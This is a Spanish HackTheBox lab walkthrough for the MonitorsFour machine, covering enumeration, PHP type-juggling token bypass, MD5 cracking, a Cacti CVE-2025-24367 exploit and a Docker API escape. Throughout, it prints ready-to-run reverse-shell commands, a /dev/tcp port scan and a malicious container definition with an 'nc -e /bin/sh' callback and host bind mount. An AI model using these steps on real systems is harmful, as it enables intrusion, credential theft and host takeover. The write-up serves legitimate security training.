# MonitorsFour - Guía Detallada Paso a Paso

**Análisis completo de la explotación de MonitorsFour (HTB Easy)**

Documento educativo que explica cada fase de la cadena de explotación: desde reconocimiento hasta escape de Docker.

---

## Tabla de Contenidos

1. [Fase 0: Preparación](#fase-0-preparación)
2. [Fase 1: Reconocimiento Inicial](#fase-1-reconocimiento-inicial)
3. [Fase 2: Descubrimiento de Vulnerabilidad API](#fase-2-descubrimiento-de-vulnerabilidad-api)
4. [Fase 3: Extracción y Cracking de Credenciales](#fase-3-extracción-y-cracking-de-credenciales)
5. [Fase 4: Explotación de Cacti (CVE-2025-24367)](#fase-4-explotación-de-cacti-cve-2025-24367)
6. [Fase 5: Escape de Docker via API](#fase-5-escape-de-docker-via-api)
7. [Concepto Clave: PHP Type Juggling](#concepto-clave-php-type-juggling)

---

## Fase 0: Preparación

### ¿Qué es MonitorsFour?

MonitorsFour es una máquina Easy en HackTheBox que simula un entorno real con:
- **API vulnerable** (PHP con type juggling)
- **Aplicación web** (Cacti - herramienta de monitoreo)
- **Contenedor Docker** (con configuración insegura)
- **Múltiples capas** que requieren explotación secuencial

### Requisitos

```bash
# Necesitas tener acceso a HTB
# Máquina ejecutándose
# Acceso VPN configurado

# En tu máquina atacante necesitas:
- nmap (escaneo de puertos)
- ffuf (fuzzing)
- hashcat o john (cracking de hashes)
- curl (requests HTTP)
- netcat (reverse shells)
- Python (para scripts)
```

### Agregar IP a /etc/hosts

```bash
sudo nano /etc/hosts

# Agregar estas líneas
10.10.11.98     monitorsfour.htb
10.10.11.98     cacti.monitorsfour.htb
```

**¿Por qué?** Los navegadores y herramientas necesitan resolver nombres de dominio. Sin esto, `monitorsfour.htb` no funciona.

---

## Fase 1: Reconocimiento Inicial

### Paso 1.1: Verificar Conectividad

```bash
ping 10.10.11.98
```

**Esperado:**
```
PING 10.10.11.98 (10.10.11.98) 56(84) bytes of data.
64 bytes from 10.10.11.98: icmp_seq=1 ttl=63 time=45.3 ms
```

**¿Qué significa?** La máquina está activa y podemos comunicarnos.

---

### Paso 1.2: Escaneo de Puertos

```bash
nmap -p- 10.10.11.98 -v
```

**Parámetros explicados:**
- `-p-` = Escanear todos los 65535 puertos
- `-v` = Verbose (mostrar progreso)

**Esperado (puertos abiertos):**
```
22/tcp   open   ssh
80/tcp   open   http
3306/tcp open   mysql
```

**Interpretación:**
- Puerto 22: SSH (acceso remoto)
- Puerto 80: HTTP (servidor web)
- Puerto 3306: MySQL (base de datos)

---

### Paso 1.3: Identificar Servicios y Versiones

```bash
nmap -sV -p 22,80,3306 10.10.11.98
```

**Parámetros:**
- `-sV` = Detectar versiones de servicios

**Esperado:**
```
22/tcp   open  ssh     OpenSSH 8.2p1
80/tcp   open  http    Apache httpd 2.4.41
3306/tcp open  mysql   MySQL 5.7.32
```

**¿Por qué es importante?** Cada versión puede tener vulnerabilidades conocidas.

---

## Fase 2: Descubrimiento de Vulnerabilidad API

### Paso 2.1: Escanear Directorios Web

```bash
dirsearch -u http://monitorsfour.htb -x 404
```

**Parámetros:**
- `-u` = URL objetivo
- `-x 404` = Ignorar respuestas 404

**Salida esperada:**
```
[13:55:24] 200 -   97B  - /.env
[13:55:25] 403 -  548B  - /.htaccess
...
```

**¿Qué encontramos?** Archivo `.env` accesible = **¡INFORMACIÓN SENSIBLE!**

---

### Paso 2.2: Leer Archivo .env

```bash
curl http://monitorsfour.htb/.env
```

**Salida:**
```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

**¿Qué significa?** 
- Credenciales de base de datos expuestas
- Información sobre la arquitectura
- Podemos intentar acceso a MySQL (si está expuesto)

---

### Paso 2.3: Descubrir Subdominios

```bash
ffuf -c -u http://monitorsfour.htb/ \
     -H "Host: FUZZ.monitorsfour.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -fw 3
```

**Explicación:**
- `-c` = Colorized output (bonito)
- `FUZZ` = Posición a reemplazar con wordlist
- `-fw 3` = Filtrar respuestas con 3 palabras (para ignorar respuestas genéricas)

**Resultado esperado:**
```
cacti                   [Status: 200, Size: 5234]
```

**Significa:** Existe `cacti.monitorsfour.htb` (otra aplicación web)

---

### Paso 2.4: Explorar API en /user

```bash
curl http://monitorsfour.htb/user
```

**Respuesta (error):**
```json
{"error": "Invalid token"}
```

**¿Qué aprendemos?** 
- La API requiere un parámetro `token`
- Formato: `http://monitorsfour.htb/user?token=ALGO`

---

### Paso 2.5: Intentar Acceso sin Autenticación

```bash
# Intento 1: Token vacío
curl "http://monitorsfour.htb/user?token="

# Intento 2: Token 0 (cero)
curl "http://monitorsfour.htb/user?token=0"

# Intento 3: Token con "0e" (magic hash)
curl "http://monitorsfour.htb/user?token=0e1234567890"
```

**¿Por qué 0e?** → Sigue a "Fase 3: Concepto de PHP Type Juggling"

---

## Concepto Clave: PHP Type Juggling

### ¿Qué es "Type Juggling"?

PHP es un lenguaje **débilmente tipado**. Esto significa que puede convertir automáticamente entre tipos:

```php
// Ejemplo 1: String a número
$a = "5 gatos";
$b = 5;
if ($a == $b) {
    echo "¡Son iguales!"; // Esto imprime
}

// Ejemplo 2: "0e" magic hash
$hash1 = md5("240610708");        // Resultado: 0e462097431906509019606901367716627
$hash2 = md5("hashkali");         // Resultado: 0e323274326326325826350326024328327
if ($hash1 == $hash2) {
    echo "¡Iguales!";  // Esto imprime también
}
```

**¿Por qué?** PHP ve `0e` seguido de dígitos como **notación científica** (0 × 10^algo = 0)

```
0e123456 == 0e789012  →  0 == 0  →  true
```

### En el contexto de MonitorsFour

```php
// Código vulnerable (supuesto)
if ($user_token == $database_token) {
    return user_data;
}
```

Si ambos tokens comienzan con `0e` y tienen solo dígitos después:
```
user_token:     "0e1234567890"  (lo que enviamos)
database_token: "0e9876543210"  (almacenado en DB)

0e1234... == 0e9876...  →  0 == 0  →  ¡ACCESO GARANTIZADO!
```

---

## Fase 2.5: Fuzzing de Tokens (Continuación)

### Paso 2.5.1: Crear/Usar Wordlist

```bash
# Opción 1: Usar wordlist existente
# /usr/share/seclists/Fuzzing/magic-numbers.txt

# Opción 2: Crear una rápida
cat > php_loose_comparison.txt << 'EOF'
0e1234567890
0e2345678901
0e3456789012
0e0000000000
0e999999999
FUZZ1
FUZZ2
EOF
```

### Paso 2.5.2: Fuzzear con FFUF

```bash
ffuf -c -u "http://monitorsfour.htb/user?token=FUZZ" \
     -w php_loose_comparison.txt \
     -fw 4
```

**Parámetros:**
- `-fw 4` = Filtrar respuestas con 4 palabras (ignora {"error": "Invalid token"})

**Esperado:**
```
0e1234567890  [Status: 200, Size: 1250]  ← ¡Esto es diferente!
```

**¿Significa qué?** Token válido encontrado, respuesta diferente = probablemente datos del usuario.

---

### Paso 2.5.3: Verificar Respuesta Exitosa

```bash
curl "http://monitorsfour.htb/user?token=0e1234567890" | jq .
```

**Salida esperada (JSON formateado):**
```json
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "d6bd275c53a034b294"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "standard user"
  }
]
```

**¡ÉXITO!** Tenemos:
- Nombres de usuario
- Hashes de contraseñas (MD5)
- Roles
- Tokens internos

---

## Fase 3: Extracción y Cracking de Credenciales

### Paso 3.1: Guardar Hashes

```bash
# Crear archivo con hashes
cat > hashes.txt << 'EOF'
admin:56b32eb43e6f15395f6c46c1c9e1cd36
mwatson:69196959c16b26ef00b77d82cf6eb169
EOF
```

### Paso 3.2: Identificar Tipo de Hash

```bash
# Puede ser MD5, SHA1, etc.
# Usamos hash-identifier o simplemente intentamos con hashcat

# 32 caracteres hexadecimales = probablemente MD5
```

### Paso 3.3: Crackear con Hashcat

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Parámetros:**
- `-m 0` = Modo MD5
- `hashes.txt` = Archivo con hashes
- `rockyou.txt` = Wordlist (diccionario de contraseñas comunes)

**Salida esperada:**
```
56b32eb43e6f15395f6c46c1c9e1cd36:wonderful
69196959c16b26ef00b77d82cf6eb169:wonderful1
```

**Resultado:**
- admin : wonderful
- mwatson : wonderful1

### Alternativa: Usar John the Ripper

```bash
john --format=Raw-MD5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Fase 4: Explotación de Cacti (CVE-2025-24367)

### Paso 4.1: Acceder a Cacti

```bash
# Primero verificar que Cacti está accesible
curl -I http://cacti.monitorsfour.htb
```

**Esperado:**
```
HTTP/1.1 200 OK
```

---

### Paso 4.2: Obtener PoC del CVE

```bash
# Clonar exploit público
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
cd CVE-2025-24367-Cacti-PoC

# Ver contenido
ls -la
```

**¿Qué es un PoC?** "Proof of Concept" - código que demuestra una vulnerabilidad.

### Paso 4.3: Preparar Reverse Shell

```bash
# En tu máquina atacante, inicia listener
nc -lnvp 60001
```

**Explicación:**
- `nc` = netcat (herramienta de redes)
- `-l` = Escuchar
- `-n` = No hacer DNS lookup
- `-v` = Verbose
- `-p 60001` = Puerto a escuchar

**¿Qué hace?** Abre un "puesto de escucha" esperando conexión de reverse shell.

---

### Paso 4.4: Ejecutar Exploit

```bash
python exploit.py \
  -u mwatson \
  -p wonderful1 \
  -url http://cacti.monitorsfour.htb \
  -i 10.10.14.47 \
  -l 60001
```

**Parámetros explicados:**
- `-u` = Username (mwatson)
- `-p` = Password (wonderful1)
- `-url` = URL de Cacti (sin trailing slash)
- `-i` = IP atacante (la que retorna la shell)
- `-l` = Puerto listener

**Salida esperada:**
```
[+] Cacti Instance Found!
[+] Login Successful!
[+] Got graph ID: 226
[+] Created PHP filename: iTxlZ.php
[+] Hit timeout, looks good for shell, check your listener!
```

---

### Paso 4.5: Verificar Shell en Listener

**En la terminal con netcat:**
```
listening on [any] 60001 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.11.98] 55259
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
www-data@821fbd6a43fa:~/html/cacti$
```

**¿Qué significa?** ¡Tenemos shell remota como usuario `www-data` dentro del contenedor!

---

### Paso 4.6: Explorar Contenedor

```bash
# Ver información del sistema
whoami                    # www-data
id                       # uid=33(www-data) gid=33(www-data)
hostname                 # 821fbd6a43fa (ID del contenedor)
cat /etc/resolv.conf     # Muestra gateway: 192.168.65.7

# Ver ubicación actual
pwd                      # /var/www/html

# Listar archivos
ls -la
```

---

### Paso 4.7: Obtener Flag de Usuario

```bash
# Navegar al home del usuario
cd /home/marcus

# Listar archivos
ls -la

# Ver contenido del flag
cat user.txt
# 8103acb8***...***c2e2d1104
```

**PRIMER FLAG OBTENIDO** ✓

---

## Fase 5: Escape de Docker via API

### ¿Por qué escapar de Docker?

Estamos dentro de un **contenedor Linux aislado**. Para obtener el root flag (en Windows host), necesitamos:
1. Salir del contenedor
2. Acceder al host Windows
3. Leer el archivo de root

---

### Paso 5.1: Reconocimiento Interno

```bash
# Ver gateway (salida del contenedor)
cat /etc/resolv.conf
# nameserver 127.0.0.11
# nameserver 192.168.65.7  ← ESTO ES IMPORTANTE

# El IP 192.168.65.7 es el host Windows
```

---

### Paso 5.2: Escanear Puertos Internos

```bash
# Script para scanear puertos del gateway
for p in 21 22 23 53 80 443 445 2375 2376 2377 3306 5432 6379 27017 9200 5601 9000; do
  (timeout 0.3 bash -c "echo >/dev/tcp/192.168.65.7/$p" 2>/dev/null) \
    && echo "OPEN: $p" || echo -n "."
done
```

**Esperado:**
```
OPEN: 53
OPEN: 2375  ← ¡DOCKER API SIN AUTENTICACIÓN!
```

**¿Por qué 2375?** Es el puerto del Docker daemon (servicio de Docker).

---

### Paso 5.3: Enumerar Docker API

```bash
# Ver imágenes disponibles
curl -s http://192.168.65.7:2375/images/json | jq

# Esperado:
[
  {
    "Id": "sha256:93b5d01a98de324793...",
    "RepoTags": ["docker_setup-nginx-php:latest"],
    ...
  }
]
```

**¿Qué nos dice?** Podemos crear contenedores basados en `docker_setup-nginx-php:latest`

---

### Paso 5.4: Crear Contenedor Malicioso con Bind Mount

**¿Qué es un Bind Mount?** Montar un directorio del host dentro del contenedor.

```json
{
  "Image": "docker_setup-nginx-php:latest",
  "Cmd": ["/bin/sh", "-c", "nc -e /bin/sh 10.10.14.47 60002"],
  "HostConfig": {
    "Binds": ["/host_root:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
```

**Desglose:**
- `Image`: Imagen a usar
- `Cmd`: Comando a ejecutar (reverse shell)
- `Binds`: **Montar `/` del host en `/mnt/host_root` del contenedor**
- Resultado: ¡Acceso total al filesystem del host!

---

### Paso 5.5: Crear el Archivo JSON en la Máquina Atacante

```bash
cat > create_container.json << 'EOF'
{
  "Image": "docker_setup-nginx-php:latest",
  "Cmd": ["/bin/sh", "-c", "nc -e /bin/sh 10.10.14.47 60002"],
  "HostConfig": {
    "Binds": ["/host_root:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
EOF

# Servir por HTTP
python3 -m http.server 8000
```

---

### Paso 5.6: Descargar JSON en el Contenedor

```bash
# Desde la shell de www-data en Cacti
curl http://10.10.14.47:8000/create_container.json -o create_container.json

# Verificar descarga
cat create_container.json
```

---

### Paso 5.7: Crear Contenedor via Docker API

```bash
# Desde shell de www-data
curl -H "Content-Type: application/json" \
     -d @create_container.json \
     http://192.168.65.7:2375/containers/create \
     -o resp.json

# Ver respuesta
cat resp.json
# {"Id":"26d70bac22282409918b13cd2f4169200ac452ae6198468edec4c7a2ba52046b",...}

# Guardar ID para el siguiente paso
cid="26d70bac22282409918b13cd2f4169200ac452ae6198468edec4c7a2ba52046b"
```

---

### Paso 5.8: Iniciar Contenedor

```bash
# Iniciar el contenedor creado
curl -X POST http://192.168.65.7:2375/containers/$cid/start
```

**¿Qué sucede?** El contenedor se ejecuta y ejecuta el comando: `nc -e /bin/sh 10.10.14.47 60002`

**Esto intenta hacer una reverse shell a tu máquina atacante.**

---

### Paso 5.9: Recibir Shell como ROOT

**En tu máquina atacante (listener diferente):**

```bash
# Abre otro listener
nc -lnvp 60002
```

**Esperado:**
```
listening on [any] 60002 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.11.98] 56531
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@732fe8bf4ee8:/var/www/html#
```

**¡Ahora eres ROOT en el contenedor!**

---

### Paso 5.10: Acceder al Flag de Root

```bash
# El flag está en el host, montado en /mnt/host_root
cd /mnt/host_root

# Navegar a la ruta del flag en Windows
cat /mnt/host_root/Users/Administrator/Desktop/root.txt
# f448127512...
```

**SEGUNDO FLAG OBTENIDO** ✓

---

## Resumen de la Cadena de Explotación

```
┌─────────────────────────────────────┐
│  1. API Type Juggling Bypass        │
│     (PHP == vulnerability)          │
└─────────────┬───────────────────────┘
              │
              ▼
┌─────────────────────────────────────┐
│  2. Extraer Hashes MD5 de Usuarios  │
│     admin, mwatson                  │
└─────────────┬───────────────────────┘
              │
              ▼
┌─────────────────────────────────────┐
│  3. Crackear Hashes (hashcat)       │
│     Obtener: wonderful1              │
└─────────────┬───────────────────────┘
              │
              ▼
┌─────────────────────────────────────┐
│  4. Explotar CVE-2025-24367 (Cacti)│
│     RCE como www-data               │
│     Obtener: user flag              │
└─────────────┬───────────────────────┘
              │
              ▼
┌─────────────────────────────────────┐
│  5. Explotar Docker API (2375)      │
│     Crear contenedor con bind mount │
│     Acceso a filesystem del host    │
│     RCE como root                   │
│     Obtener: root flag              │
└─────────────────────────────────────┘
```

---

## Lecciones de Seguridad

### 1. **No expongas .env**
- Archivos de configuración nunca deben ser públicos
- Usa `.gitignore` para excluirlos

### 2. **Valida entrada correctamente**
- No uses `==` (loose comparison) en PHP
- Usa `===` (strict comparison)

### 3. **Patcha aplicaciones críticas**
- Cacti, WordPress, etc.
- Las vulnerabilidades 0-day no existen para siempre

### 4. **Asegura Docker**
- **NUNCA** expongas el Docker daemon API sin autenticación
- Usa credenciales TLS
- Implementa firewall interno

### 5. **Sigue el principio de menor privilegio**
- Los servicios web no deben correr como root
- Los contenedores deben tener permisos mínimos

---

## Herramientas Utilizadas

| Herramienta | Uso | Alternativa |
|------------|-----|-------------|
| `nmap` | Escaneo de puertos | `rustscan`, `masscan` |
| `ffuf` | Fuzzing (subdominios, tokens) | `gobuster`, `wfuzz` |
| `curl` | Requests HTTP | `wget`, `python requests` |
| `hashcat` | Cracking de hashes | `john`, `hashcat`, `online tools` |
| `netcat` | Reverse shells | `socat`, `bash`, `/dev/tcp` |
| `jq` | Parsear JSON | `python -m json.tool` |

---

## Conclusión

MonitorsFour demuestra una **cadena realista de explotación**:

1. Encontrar información (enumeración)
2. Explotar lógica defectuosa (type juggling)
3. Escalar acceso (credenciales → RCE)
4. Evadir confinamiento (escape de contenedor)
5. Obtener acceso máximo (root flag)

**Cada paso es común en penetration testing real.**

